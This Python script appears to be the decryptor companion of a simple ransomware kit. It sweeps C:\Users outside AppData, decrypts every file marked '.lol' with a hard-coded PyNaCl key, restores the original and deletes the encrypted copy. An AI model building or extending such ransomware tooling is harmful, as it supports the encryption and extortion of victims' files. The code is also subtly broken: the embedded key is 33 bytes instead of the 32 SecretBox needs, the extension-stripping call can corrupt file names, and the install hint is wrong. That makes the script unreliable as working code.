#!/usr/bin/python3

try :
    import nacl, nacl.secret, pathlib, os # Our requirement 
except:
    print("Error try To run pip install requirement.txt")

"""Making class in order to decrypt"""

class Decrypt(object):                                     

    def __init__(self, Target,BoxM):     
        self.Target = Target          #Our file Location 
        self.BoxM   = BoxM            #Box Moudle 

    def FileE(loc):
        DeFileN     = (loc.Target).strip(".lol") #Remove .lol 
        EnFileN     = (loc.Target)               # Our encrypted File name
        Date        = 0                          # Making null Date Var

        with open(EnFileN,"rb") as  File: Date = File.read()       # Read encrypted File and set all the date to the Date Var
        Decrypted   = loc.BoxM.decrypt(Date)                       # Decrypte File
        with open(DeFileN,"wb") as  File: File.write(Decrypted)    # Save File to is the original state
        os.remove(EnFileN)                  # Removing Old file 
        print(f"Decrypted -> {DeFileN}")    # You can remove if you went This line is for deBuging 

"""Setting Up Some Global Vars""" 

Key     = b'\x8e\xb7\x3c\x88\xfa\x11\xd9\x6f\xa3\x5e\x42\xdd\x89\xec\x01\x99\x24\xdb\x57\x8c\xbb\xe9\x31\xae\x77\x46\xf5\x6b\x08\x3a\xcf\x92\xd1'              # Add your key hare
box     = nacl.secret.SecretBox(Key)    # Our Safe box Moudle that we use to Decrypte
Paths   = [r"C:\Users\\"]               # List of paths to Look for Files in 

"""Our ForLoop So we walkthrough Our paths """

for  AllFiles in Paths:                                             # For all files in our list
    if (pathlib.Path(AllFiles).exists()):                           # Check if Path is a file, not a folder 
        for path, subdirs, files in os.walk(AllFiles):
            if(("\\AppData\\") in path):pass                            # This is our blocklist you can add more 
            else:
                for file in files :                                 # For all of files in that folder 
                    if(".lol" in file):                             # Check if File have .lol formate 
                        FilePath    = os.path.join(path, file)      # Join Our path to our file nmae 
                        Decrypt(FilePath,box).FileE()               # Call our Decrypt Moudle 
